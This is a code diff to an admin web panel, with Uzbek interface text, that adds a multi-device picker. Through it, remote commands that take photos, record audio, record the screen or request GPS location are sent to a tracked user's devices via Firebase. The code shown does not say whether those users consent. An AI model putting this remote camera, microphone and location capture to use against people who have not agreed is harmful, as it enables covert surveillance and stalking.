@@ -359,8 +359,22 @@ function updateAdminStatusHeader() {
   if (!badgeEl) return;
 
   const now = Date.now();
-  const isOnline = (now - adminDeviceData.heartbeat) < 65000;
-  const batteryStr = adminDeviceData.battery !== null ? `${adminDeviceData.battery}%` : '--';
+  let latestSeen = adminDeviceData.heartbeat || 0;
+  if (adminUserDevices && adminUserDevices.length > 0) {
+    adminUserDevices.forEach(d => {
+      if (d.lastSeen && d.lastSeen > latestSeen) {
+        latestSeen = d.lastSeen;
+      }
+    });
+  }
+  const isOnline = (now - latestSeen) < 70000;
+
+  let batteryVal = adminDeviceData.battery;
+  if (batteryVal === null && adminUserDevices && adminUserDevices.length > 0) {
+    const devWithBat = adminUserDevices.find(d => d.battery !== undefined && d.battery !== null);
+    if (devWithBat) batteryVal = devWithBat.battery;
+  }
+  const batteryStr = batteryVal !== null ? `${batteryVal}%` : '--';
 
   badgeEl.innerHTML = `
     <div style="display: flex; align-items: center; gap: 6px;">
@@ -472,77 +486,200 @@ function updateAdminMapLocation(lat, lon) {
   }, 200);
 }
 
+// Multi-device selection modal flow
+let pendingDevicePickerCallback = null;
+
+function promptAdminDeviceTarget(actionName, onDeviceChosen) {
+  const now = Date.now();
+  const activeDevices = (adminUserDevices || []).filter(d => (now - (d.lastSeen || 0)) < 900000);
+  const devices = activeDevices.length > 0 ? activeDevices : (adminUserDevices || []);
+
+  if (devices.length <= 1) {
+    const chosenId = devices.length === 1 ? devices[0].id : (adminSelectedDeviceId || 'all');
+    onDeviceChosen(chosenId);
+    return;
+  }
+
+  pendingDevicePickerCallback = onDeviceChosen;
+  const modal = document.getElementById('admin-device-picker-modal');
+  const titleEl = document.getElementById('admin-device-picker-title');
+  const descEl = document.getElementById('admin-device-picker-desc');
+  const listEl = document.getElementById('admin-device-picker-list');
+
+  if (titleEl) titleEl.innerText = `${actionName} - Qurilmani tanlang`;
+  if (descEl) descEl.innerText = `Ushbu akkauntda ${devices.length} ta qurilma aniqlandi. Qaysi qurilmaga buyruq yuborilsin?`;
+
+  if (listEl) {
+    listEl.innerHTML = `
+      <div onclick="selectPickerDevice('all')" style="display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; background: #F0FDF4; border: 1.5px solid #86EFAC; border-radius: 10px; cursor: pointer; transition: background 0.2s;">
+        <div style="display: flex; align-items: center; gap: 10px;">
+          <span style="font-size: 20px;">🌐</span>
+          <div>
+            <div style="font-weight: 700; font-size: 13px; color: #166534;">Barcha qurilmalardan bir vaqtda</div>
+            <div style="font-size: 11px; color: #15803D;">Barcha ${devices.length} ta qurilmaga buyruq yuboriladi</div>
+          </div>
+        </div>
+        <span style="font-size: 11px; font-weight: bold; color: #16A34A; background: #DCFCE7; padding: 3px 8px; border-radius: 6px;">Hammasi</span>
+      </div>
+      ${devices.map(d => {
+        const isDevOnline = (now - (d.lastSeen || 0)) < 70000;
+        const isWeb = d.type === 'web' || (d.name && d.name.toLowerCase().includes('web'));
+        const icon = isWeb ? '💻' : '📱';
+        const name = d.name || d.model || d.id;
+        const bText = (d.battery !== undefined && d.battery !== null) ? ` • 🔋 ${d.battery}%` : '';
+        const timeAgo = Math.round((now - (d.lastSeen || 0)) / 1000);
+        const seenText = isDevOnline ? '🟢 Hozir Online' : `⚪ ${Math.round(timeAgo / 60)} daq. oldin`;
+
+        return `
+          <div onclick="selectPickerDevice('${escapeHtml(d.id)}')" style="display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; background: #F8FAFC; border: 1.5px solid #E2E8F0; border-radius: 10px; cursor: pointer; transition: background 0.2s;">
+            <div style="display: flex; align-items: center; gap: 10px;">
+              <span style="font-size: 20px;">${icon}</span>
+              <div>
+                <div style="font-weight: 700; font-size: 13px; color: var(--navy-dark);">${escapeHtml(name)}</div>
+                <div style="font-size: 11px; color: #64748B;">ID: ${escapeHtml(d.id.substring(0, 16))}${bText}</div>
+              </div>
+            </div>
+            <span style="font-size: 11px; font-weight: 600; color: ${isDevOnline ? '#16A34A' : '#64748B'}; background: ${isDevOnline ? '#DCFCE7' : '#F1F5F9'}; padding: 3px 8px; border-radius: 6px;">
+              ${seenText}
+            </span>
+          </div>
+        `;
+      }).join('')}
+    `;
+  }
+
+  if (modal) modal.style.display = 'flex';
+}
+
+function selectPickerDevice(deviceId) {
+  closeAdminDevicePicker();
+  adminSelectedDeviceId = deviceId;
+  const subSelect = document.getElementById('admin-subdevice-select');
+  if (subSelect) subSelect.value = deviceId;
+  if (pendingDevicePickerCallback) {
+    const cb = pendingDevicePickerCallback;
+    pendingDevicePickerCallback = null;
+    cb(deviceId);
+  }
+}
+
+function closeAdminDevicePicker() {
+  const modal = document.getElementById('admin-device-picker-modal');
+  if (modal) modal.style.display = 'none';
+  pendingDevicePickerCallback = null;
+}
+
 // Commands
 let lastAdminTakePhotoTime = 0;
 function adminSendTakePhoto() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
   const now = Date.now();
-  if (now - lastAdminTakePhotoTime < 3000) {
+  if (now - lastAdminTakePhotoTime < 2500) {
     showToast("Iltimos, kuting... Rasm olinmoqda");
     return;
   }
-  lastAdminTakePhotoTime = now;
 
-  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
-  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
+  promptAdminDeviceTarget("Rasm Olish", (chosenDevId) => {
+    lastAdminTakePhotoTime = Date.now();
+    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
+    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : (chosenDevId === 'all' ? ' (barcha qurilmalardan)' : '');
+    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
 
-  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(now);
-  showToast(isOnline ? `Rasm olish buyrug'i yuborildi${devName}!` : `Rasm olish buyrug'i navbatga qo'yildi${devName}`);
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+      target_device_id: chosenDevId || 'all',
+      take_photo: Date.now()
+    });
+    showToast(isOnline ? `Rasm olish buyrug'i yuborildi${devName}!` : `Rasm olish buyrug'i navbatga qo'yildi${devName}`);
+  });
 }
 
 function adminToggleRecordAudio() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
-  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
-  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
 
-  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
-  const nextState = !adminDeviceData.isAudioRecordingActive;
-  adminDeviceData.isAudioRecordingActive = nextState;
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_audio`).set(nextState);
-
-  const btn = document.getElementById('admin-voice-btn');
-  if (btn) {
-    btn.innerHTML = nextState 
-      ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
-      : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish";
-    btn.className = nextState ? "btn btn-red" : "btn btn-yellow";
+  if (adminDeviceData.isAudioRecordingActive) {
+    adminDeviceData.isAudioRecordingActive = false;
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+      record_audio: false
+    });
+    const btn = document.getElementById('admin-voice-btn');
+    if (btn) {
+      btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish";
+      btn.className = "btn btn-yellow";
+    }
+    showToast("Ovoz yozish to'xtatildi, saqlanmoqda...");
+    return;
   }
-  showToast(nextState ? (isOnline ? `Masofaviy ovoz yozish boshlandi${devName}` : `Ovoz yozish navbatga qo'yildi${devName}`) : "Ovoz yozish to'xtatildi, saqlanmoqda...");
+
+  promptAdminDeviceTarget("Ovoz Yozish", (chosenDevId) => {
+    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
+    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : (chosenDevId === 'all' ? ' (barcha qurilmalarda)' : '');
+    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
+
+    adminDeviceData.isAudioRecordingActive = true;
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+      target_device_id: chosenDevId || 'all',
+      record_audio: true
+    });
+
+    const btn = document.getElementById('admin-voice-btn');
+    if (btn) {
+      btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish";
+      btn.className = "btn btn-red";
+    }
+    showToast(isOnline ? `Masofaviy ovoz yozish boshlandi${devName}` : `Ovoz yozish navbatga qo'yildi${devName}`);
+  });
 }
 
 function adminToggleRecordScreen() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
-  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
-  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
 
-  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
-  const nextState = !adminDeviceData.isScreenRecordingActive;
-  adminDeviceData.isScreenRecordingActive = nextState;
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_screen`).set(nextState);
-
-  const btn = document.getElementById('admin-screen-btn');
-  if (btn) {
-    btn.innerHTML = nextState 
-      ? "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish" 
-      : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis";
-    btn.style.background = nextState ? "#DC2626" : "#7C3AED";
+  if (adminDeviceData.isScreenRecordingActive) {
+    adminDeviceData.isScreenRecordingActive = false;
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+      record_screen: false
+    });
+    const btn = document.getElementById('admin-screen-btn');
+    if (btn) {
+      btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis";
+      btn.style.background = "#7C3AED";
+    }
+    showToast("Ekran yozish to'xtatildi, saqlanmoqda...");
+    return;
   }
-  showToast(nextState ? (isOnline ? `Masofaviy ekran yozish boshlandi${devName}...` : `Ekran yozish navbatga qo'yildi${devName}`) : "Ekran yozish to'xtatildi, saqlanmoqda...");
+
+  promptAdminDeviceTarget("Ekran Zapis", (chosenDevId) => {
+    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
+    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : (chosenDevId === 'all' ? ' (barcha qurilmalarda)' : '');
+    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
+
+    adminDeviceData.isScreenRecordingActive = true;
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+      target_device_id: chosenDevId || 'all',
+      record_screen: true
+    });
+
+    const btn = document.getElementById('admin-screen-btn');
+    if (btn) {
+      btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish";
+      btn.style.background = "#DC2626";
+    }
+    showToast(isOnline ? `Masofaviy ekran yozish boshlandi${devName}...` : `Ekran yozish navbatga qo'yildi${devName}`);
+  });
 }
 
 function adminSendRequestGps() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
-  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
-  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
+  promptAdminDeviceTarget("GPS Yangilash", (chosenDevId) => {
+    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
+    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
+    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
 
-  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
-  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/request_gps`).set(Date.now());
-  showToast(isOnline ? `GPS yangilash so'rovi yuborildi${devName}!` : `GPS so'rovi navbatga qo'yildi${devName}`);
+    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+      target_device_id: chosenDevId || 'all',
+      request_gps: Date.now()
+    });
+    showToast(isOnline ? `GPS yangilash so'rovi yuborildi${devName}!` : `GPS so'rovi navbatga qo'yildi${devName}`);
+  });
 }
 
 // Photos Viewer
